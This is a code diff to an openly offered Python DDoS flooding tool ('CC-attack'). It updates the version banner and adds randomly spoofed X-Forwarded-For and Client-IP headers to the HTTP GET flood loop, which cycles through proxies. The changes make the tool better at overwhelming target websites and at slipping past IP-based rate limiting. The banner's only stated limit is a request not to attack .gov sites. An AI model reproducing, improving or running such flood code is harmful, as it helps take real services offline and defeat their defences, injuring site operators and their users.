@@ -23,15 +23,15 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 2.6.1 (Fixed slow mode)
+Python3 version 2.7 (Added Fake Client)
                             C0d3d by L330n123
 ╔═════════════════════════════════════════════╗
 ║        Tos: Don't attack .gov website       ║
 ║─────────────────────────────────────────────║
 ║                 New stuff:                  ║
-║          + Removed socks4/5 mixed flood     ║
+║          + Added Random client ip           ║
 ║          + Added socks mode selection       ║
-║          + Improved Proxy checker           ║
+║          + Fixed slow mode                  ║
 ║          + More Human-like options          ║
 ║─────────────────────────────────────────────║
 ║ Link: https://github.com/Leeon123/CC-attack ║
@@ -201,7 +201,9 @@ def cc(socks_type):
 		n = "CC"
 	while True:
 		get_host = "GET " + url2 + "?" + str(random.randint(0,20000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-		request = get_host + referer + useragent + accept + connection + "\r\n"
+		fake_ip = "X-Forwarded-For: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
+		fake_ip += "Client-IP: "+str(random.randint(1,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"."+str(random.randint(0,255))+"\r\n"
+		request = get_host + referer + useragent + accept + connection + fake_ip+"\r\n"
 		try:
 			if err > 3:
 				print("[!] Target or proxy maybe down| Changing proxy")
